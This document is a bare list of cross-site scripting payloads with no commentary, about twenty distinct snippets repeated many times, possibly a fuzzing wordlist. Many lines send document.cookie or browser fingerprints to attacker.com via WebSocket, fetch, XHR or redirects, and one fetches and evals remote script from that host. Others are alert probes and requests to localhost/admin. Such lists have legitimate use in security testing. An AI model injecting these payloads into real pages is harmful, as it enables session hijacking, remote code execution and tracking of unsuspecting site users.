<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
